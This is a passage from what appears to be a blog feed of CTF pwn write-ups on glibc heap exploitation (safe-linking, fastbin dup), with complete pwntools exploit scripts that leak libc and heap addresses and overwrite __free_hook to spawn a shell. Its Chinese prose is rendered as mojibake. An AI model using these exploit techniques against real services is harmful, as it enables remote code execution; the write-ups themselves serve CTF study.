class="hljs-string">&#x27;week-3.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30719</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>tcache_max_bin=libcbase+<span class="hljs-number">0x1e3280</span>+<span class="hljs-number">80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_max_bin))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">0</span>)<br>pad1=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pad1))<br>edit(<span class="hljs-number">0</span>,p64(pad1)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(tcache_max_bin-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">5</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=(u64(s)&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x610</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(pack(heap+<span class="hljs-number">0x2930</span>,free_hook)))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">9</span>,p64(system_addr))<br>delete(<span class="hljs-number">8</span>)<br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>safe-linking</title>
    <link href="/2023/01/25/safe-linking/"/>
    <url>/2023/01/25/safe-linking/</url>
    
    <content type="html"><![CDATA[<p>hgameç¢°åˆ°çš„ï¼Œä¹‹å‰å†™æºç åˆ†æçš„æ—¶å€™å°±æ³¨æ„åˆ°äº†ä½†æ²¡ç»†çœ‹ï¼Œç»“æœç«‹é©¬å°±ç¢°è§äº†ï¼ˆæŒºç„å­¦ï¼‰ã€‚é‚£å°±æ¥ä»”ç»†åˆ†æä¸‹è¿™ä¸ªä¸œè¥¿(à¸‡ â€¢_â€¢)à¸‡</p><span id="more"></span><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>2.32å¢åŠ äº†å•é“¾è¡¨çš„ä¿æŠ¤æœºåˆ¶ï¼Œå¯¹fastbinå’Œtcacheçš„fdæŒ‡é’ˆè¿›è¡Œäº†è¿ç®—ï¼Œç›¸å…³æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>å˜åŒ–å°±æ˜¯fdæˆå‘˜çš„å†…å®¹ä»ä¸‹ä¸€ä¸ªchunkçš„åœ°å€ptrå˜æˆptr^(&amp;ptr&gt;&gt;12)ï¼ˆäº¦æˆ–ç§»ä½æ“ä½œåçš„æ‰€å­˜åœ°å€ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br><span class="hljs-comment">//e-&gt;next = tcache-&gt;entries[tc_idx];ï¼ˆ2.31æºç ï¼‰</span><br><br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><p>åœ¨æœ‰uafçš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºe-&gt;nextï¼Œä½†æœ€åˆtcacheé“¾è¡¨æ˜¯ç©ºçš„ï¼ŒåŠtcache-&gt;entries[tc_idx] &#x3D; 0ï¼Œè®¾eä¸ºæ”¾å…¥tcacheçš„tcache_entryï¼Œé‚£e-&gt;next &#x3D; (&amp;e-&gt;next&gt;&gt;12)^0 &#x3D; &amp;e-&gt;next&gt;&gt;12<br>å·²çŸ¥chunkåœ°å€å’ŒheapåŸºå€çš„åç§»æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²å‡ºæ¥çš„å€¼ç¡®å®šheapçš„åŸºå€ï¼Œè¿™æ„å‘³ç€&amp;e-&gt;nextçš„å€¼ä¹‹åéƒ½æ˜¯å·²çŸ¥çš„</p><h1 id="ä¾‹é¢˜hgame2023-week3-safe-note"><a href="#ä¾‹é¢˜hgame2023-week3-safe-note" class="headerlink" title="ä¾‹é¢˜hgame2023 week3 safe-note"></a>ä¾‹é¢˜hgame2023 week3 safe-note</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿˜æ˜¯uafï¼ˆä¸€ä¸ªuafå‡ºäº†ä¸¤æ˜ŸæœŸä¹Ÿæ˜¯é†‰äº†ï¼Œæˆ‘çœ‹è¿™ä¸ªæ–‡ä»¶éƒ½å¿«çœ‹åäº†ï¼‰  </p><ul><li><p>å…ˆæŒ‰ä¸Šæ–‡æ‰€è¯´æ³„éœ²heapåŸºå€ï¼ˆfd&lt;&lt;12å°±æ˜¯heapåŸºå€ï¼‰</p><img src="/2023/01/25/safe-linking/heapbase.png" class title="heapåŸºå€"></li><li><p>ç„¶åè€å¥—è·¯unsorted binæ³„éœ²libcåŸºå€    </p></li><li><p>å†ç”³è¯·ç„¶åé‡Šæ”¾ä¸¤ä¸ªå¦å¤–å¤§å°çš„chunkï¼ˆtcacheæœ‰chunkæ•°é‡çš„æ£€æµ‹ï¼‰ï¼Œæ›´æ”¹chunk1çš„fdä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(&amp;chunk1-&gt;fd&gt;&gt;<span class="hljs-number">12</span>)^&amp;__free_hook<br></code></pre></td></tr></table></figure><img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%89%8D.png" class title="æ›´æ”¹å‰"><img src="/2023/01/25/safe-linking/%E6%9B%B4%E6%94%B9%E5%90%8E.png" class title="æ›´æ”¹å"></li><li><p>ç„¶åå°±æ˜¯è€å¥—è·¯äº†</p></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br>p=process(<span class="hljs-string">&#x27;./safe&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;week-3.hgame.lwsec.cn&#x27;,32629)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>s=(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=u64(s)&lt;&lt;<span class="hljs-number">12</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">11</span>):<br>    add(i,<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>):<br>    delete(i)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">9</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>s=(<span class="hljs-string">b&#x27;\n&#x27;</span>+p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0xc0a</span>+<span class="hljs-number">0xb90</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">9</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x20</span>)<br>delete(<span class="hljs-number">12</span>)<br>delete(<span class="hljs-number">11</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>edit(<span class="hljs-number">11</span>, p64(pack(heap + <span class="hljs-number">0x290</span>+<span class="hljs-number">0x9b0</span>+<span class="hljs-number">0x10</span>, free_hook)))<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br>delete(<span class="hljs-number">13</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastbin dup</title>
    <link href="/2023/01/23/fastbin-dup/"/>
    <url>/2023/01/23/fastbin-dup/</url>
    
    <content type="html"><![CDATA[<p>é”µé”µï¼how2heapç³»åˆ—ç¬¬ä¸€ç¯‡ï¼æ­£å¼å¼€å§‹å †æ¼æ´ç³»åˆ—çš„å­¦ä¹ ï¼ç³»åˆ—æ¨¡å¼é¢„è®¡æ˜¯åŸç†+ä¾‹é¢˜ï¼Œè¿˜æœ‰å„ç‰ˆæœ¬çš„åˆ©ç”¨å·®å¼‚ã€‚å†²ï¼(ï½¡ï½¥âˆ€ï½¥)ï¾‰ï¾</p><span id="more"></span><h1 id="ç›¸å…³æ£€æŸ¥ï¼ˆæ‰€ç”¨æºç ç‰ˆæœ¬2-23ï¼‰"><a href="#ç›¸å…³æ£€æŸ¥ï¼ˆæ‰€ç”¨æºç ç‰ˆæœ¬2-23ï¼‰" class="headerlink" title="ç›¸å…³æ£€æŸ¥ï¼ˆæ‰€ç”¨æºç ç‰ˆæœ¬2.23ï¼‰"></a>ç›¸å…³æ£€æŸ¥ï¼ˆæ‰€ç”¨æºç ç‰ˆæœ¬2.23ï¼‰</h1><p>mallocä¸­å¯¹ä»fastbinä¸­å–chunkçš„æ£€æŸ¥åªæœ‰sizeçš„åˆæ³•æ€§æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">         <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>           &#123;<br><span class="hljs-comment">//chunksizeå’Œç›¸åº”fastbiné“¾çš„å¤§å°ç›¸ç¬¦æ£€æµ‹</span><br>             errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>           errout:<br>             malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>           &#125;<br></code></pre></td></tr></table></figure><p>freeä¸­å¯¹äºå°†chunkæ”¾è¿›fastbinçš„æ£€æŸ¥æœ‰ï¼š</p><ul><li>å¼€å§‹å¯¹æ‰€æœ‰chunkçš„å¯¹é½å’Œå¤§å°æ˜¯å¦è¶…ç•Œçš„æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//ç­›æ‰ä¸€äº›ç‰¹åˆ«å¤§çš„chunkï¼ˆè¶…å‡ºå†…å­˜è¾¹ç•Œï¼‰</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//å¯¹é½æ£€æŸ¥</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br></code></pre></td></tr></table></figure></li><li>ä¸‹ä¸€ä¸ªchunkæ˜¯ä¸æ˜¯top chunk<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">     */</span><br>     &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><br>     )<br></code></pre></td></tr></table></figure></li><li>ä¸‹ä¸€ä¸ªchunkçš„å¤§å°æ˜¯å¦è¶…ç•Œçš„æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>fastbinçš„ç¬¬ä¸€ä¸ªchunkæ˜¯ä¸æ˜¯æ’å…¥çš„chunkï¼ˆdouble freeæ£€æŸ¥ï¼‰<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br></code></pre></td></tr></table></figure></li><li>ä»¥åŠchunkçš„å¤§å°åˆæ³•æ€§æ£€æŸ¥<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h1><h2 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h2><p>ä¸ºäº†é¿å¼€freeä¸­double freeçš„æ£€æŸ¥ï¼ˆåªæ£€æŸ¥ç¬¬ä¸€ä¸ªchunkæ˜¯ä¸æ˜¯æ­£åœ¨freeçš„chunkï¼‰ï¼Œä¸€èˆ¬åœ¨double freeä¸­é—´å†freeå¦ä¸€ä¸ªchunkå½¢æˆa-&gt;b-&gt;açš„å½¢å¼å†é€šè¿‡ç”³è¯·å›ç¬¬ä¸€ä¸ªaæ¥æ”¹å˜æœ€åä¸€ä¸ªaçš„fdæŒ‡é’ˆæŒ‡å‘fake chunk<br>ä¸€èˆ¬ä¼šå°†fdæŒ‡é’ˆæŒ‡å‘__malloc_hook-0x23ï¼Œè¿™ä¸ªåœ°å€+8æœ‰ä¸€ä¸ª0x7fï¼Œå¯ä»¥ä½œä¸ºåˆæ³•çš„sizeã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨ç”³è¯·chunkçš„æ—¶å€™ç”³è¯·0x60å¤§å°çš„chunkæ¥ç»•å¼€chunkçš„sizeçš„åˆæ³•æ€§æ£€æŸ¥ï¼Œå°†malloc_hookæ”¹ä¸ºone_gadgetçš„åœ°å€ï¼ˆfree_hookå‰é¢å…¨æ˜¯0ï¼‰</p><img src="/2023/01/23/fastbin-dup/fake_chunk.png" class title="fake chunk"><h2 id="2-27-2-31"><a href="#2-27-2-31" class="headerlink" title="2.27-2.31"></a>2.27-2.31</h2><p>2.26æ¯”ä¹‹å‰æœ€å¤§çš„å˜åŒ–å°±æ˜¯åœ¨fastbinä¹‹å‰å¢åŠ äº†tcacheï¼Œåˆ©ç”¨æ–¹æ³•ä¹Ÿå‘ï¼ˆbianï¼‰ç”Ÿï¼ˆjianï¼‰äº†ï¼ˆdanï¼‰å˜ï¼ˆleï¼‰åŒ–ï¼ˆneï¼‰    </p><ul><li>å…ˆç”³è¯·7ä¸ªchunkå¡«æ»¡tcache</li><li>å†åœ¨fastbinä¸­å½¢æˆa-&gt;b-&gt;a</li><li>å†æŠŠtcacheæ¸…ç©º</li><li>å†ç”³è¯·ä¸€ä¸ªchunkå°±å¯ä»¥ç”³è¯·åˆ°aï¼ŒåŒæ—¶bå’Œaï¼ˆ2ï¼‰å°±ä¼šè¢«æ”¾è¿›tcacheï¼Œè¿™æ—¶tcacheæ˜¯è¿™æ ·çš„b-&gt;aï¼ˆfastbinçš„chunkæ”¾è¿›tcacheæ˜¯æ¯æ¬¡å–æœ€åä¸€ä¸ªchunkå†æ‰§è¡Œtcache_putï¼‰</li><li>ç”±äºtcacheä¸­æ²¡æœ‰sizeçš„æ£€æŸ¥ï¼Œæ‰€ä»¥ç›´æ¥æ”¹free_hookå°±è¡Œï¼ˆæ³¨æ„tcacheä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkä¸­çš„dataï¼‰</li></ul><h2 id="2-32ä»¥ä¸Š"><a href="#2-32ä»¥ä¸Š" class="headerlink" title="2.32ä»¥ä¸Š"></a>2.32ä»¥ä¸Š</h2><p>å¢åŠ äº†å•é“¾è¡¨çš„æŒ‡é’ˆä¿æŠ¤æœºåˆ¶ä»¥åŠåœ°å€0x10å¯¹é½æ£€æŸ¥ï¼ˆé”™ä½æ‰¾0x7fæ‰“fastbinä¸è¡Œäº†ï¼‰</p><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="hgame2023-week2-fast-note"><a href="#hgame2023-week2-fast-note" class="headerlink" title="hgame2023 week2 fast_note"></a>hgame2023 week2 fast_note</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>libcç‰ˆæœ¬2.23<br>é‡‘å…¸çš„èœå•é¢˜ï¼Œæœ‰UAFã€‚æ€è·¯å°±æ˜¯å…ˆå¡«æ»¡tcacheåˆ©ç”¨unsorted binæ³„éœ²libcåŸºå€ï¼Œå†ç”¨fastbin double freeå°†malloc_hookæ”¹ä¸ºone_gadget<br>è¿™é“é¢˜éº»çƒ¦çš„åœ°æ–¹åœ¨äºå››ä¸ªone_gadgetéƒ½ä¸å¯ç”¨ </p><img src="/2023/01/23/fastbin-dup/one_gadget.png" class title="one_gadget"><p>å…¶ä¸­åä¸‰ä¸ªone_gadgeté™å®šçš„æ˜¯æ ˆç©ºé—´ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡reallocè°ƒèŠ‚æ ˆå†…å®¹</p><h3 id="reallocè°ƒèŠ‚æ ˆå†…å®¹"><a href="#reallocè°ƒèŠ‚æ ˆå†…å®¹" class="headerlink" title="reallocè°ƒèŠ‚æ ˆå†…å®¹"></a>reallocè°ƒèŠ‚æ ˆå†…å®¹</h3><p>reallocçš„æ‰§è¡Œæµç¨‹å’Œmallocä¸€æ ·ä¹Ÿæ˜¯å…ˆæ£€æŸ¥hookæ˜¯å¦ä¸ºnullï¼Œå¦‚æœä¸ä¸ºnullå°±è°ƒç”¨hook<br>reallocå‡½æ•°å¼€å¤´æœ‰å¾ˆå¤špushæŒ‡ä»¤ï¼Œå¯ä»¥é€šè¿‡pushæŒ‡ä»¤æŠ¬é«˜æ 